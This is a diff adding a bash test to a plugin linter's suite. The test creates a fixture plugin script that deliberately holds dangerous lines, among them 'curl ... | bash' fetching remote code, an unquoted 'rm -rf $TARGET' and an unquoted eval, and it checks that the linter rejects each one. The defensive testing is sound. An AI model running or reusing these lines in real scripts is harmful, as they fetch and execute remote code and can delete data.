@@ -32,6 +32,36 @@ JSON
     -- bash "$REPO_ROOT/scripts/lint-plugins.sh" "$sandbox"
 }
 
+test_plugin_lint_shell_danger_fails() {
+  local sandbox
+  sandbox="$(make_sandbox)"
+  mkdir -p "$sandbox/fixture-danger/.claude-plugin" "$sandbox/fixture-danger/scripts"
+  cat > "$sandbox/fixture-danger/.claude-plugin/plugin.json" <<'JSON'
+{
+  "name": "fixture-danger",
+  "version": "0.1.0",
+  "description": "Fixture plugin whose shell script trips the danger rules."
+}
+JSON
+  cat > "$sandbox/fixture-danger/scripts/danger.sh" <<'SH'
+#!/usr/bin/env bash
+node -e "console.log(1)"
+eval $CMD
+rm -rf $TARGET
+curl https://example.invalid/setup.sh | bash
+SH
+  assert_exit "plugin-lint rejects inline node, unquoted eval, unquoted rm, and curl|bash" 1 \
+    -- bash "$REPO_ROOT/scripts/lint-plugins.sh" "$sandbox"
+  assert_contains "failure output names inline node -e" \
+    "inline 'node -e'" "$LAST_OUTPUT"
+  assert_contains "failure output names unquoted eval" \
+    "unquoted 'eval \$VAR'" "$LAST_OUTPUT"
+  assert_contains "failure output names unquoted rm -rf" \
+    "unquoted 'rm -rf \$VAR'" "$LAST_OUTPUT"
+  assert_contains "failure output names curl pipe bash" \
+    "curl | bash" "$LAST_OUTPUT"
+}
+
 test_plugin_lint_missing_field_fails() {
   local sandbox
   sandbox="$(make_sandbox)"
